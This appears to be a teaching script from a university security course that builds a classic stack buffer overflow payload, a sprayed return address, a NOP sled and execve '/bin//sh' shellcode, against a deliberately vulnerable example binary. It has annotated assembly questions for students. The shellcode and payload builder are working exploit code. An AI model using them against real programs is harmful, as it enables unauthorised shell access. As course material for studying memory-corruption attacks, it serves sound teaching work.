#!/usr/bin/env python

# Marcus Botacin
# UFPR - 2018
# Security Course Presentation
# Buffer overflow example
# Payload generation
# Adapted Binary: https://github.com/npapernot/buffer-overflow-attack
# Adapted Exploit: https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/

import struct   # endianess
import sys      # arguments

# Just check arguments were provided
if(len(sys.argv)!=3):
    print("Usage: python %s <outfile> <sc number>" % sys.argv[0])
    sys.exit(0)

# retrieve this addr from GDB
ret_addr=0xffffce60
# JUNK or SPRAY
spray_size=10

# Choose a shellcode
if int(sys.argv[2])==1:
    shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x90'
    # PAYLOAD EXPLANATION
    # 31 c0     xorl    %eax,%eax              # WHY XOR EAX,EAX ?
    # 50        pushl   %eax                   
    # 68 "//sh" pushl   $0x68732f2f            # WHY SH BEFORE BIN ?
    # 68 "/bin" pushl   $0x6e69622f            
    # 89 e3     movl    %esp,%ebx              
    # 50        pushl   %eax                   
    # 53        pushl   %ebx                   
    # 89 e1     movl    %esp,%ecx              
    # 99        cdql                           
    # b0 0b     movb    $0x0b,%al              
    # cd 80     int     $0x80                  # WHY INT 80 ?
else:
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

# NOP Sled size
nop_size=0x1Dc-len(shellcode)

# CHARs definitions

# NOP
nop='\x90'
# C-like string terminator
str_terminator='\x00'

#endianess convertion
def conv(num):
 return struct.pack("<I",num)

# start with an empty buffer
buf = ''

# buf = Junk/Spray + RA + NOP's + Shellcode
buf += conv(ret_addr) * spray_size
buf += nop * nop_size
buf += shellcode
buf += str_terminator

# write payload to file
f = open(sys.argv[1],"wb").write(buf)
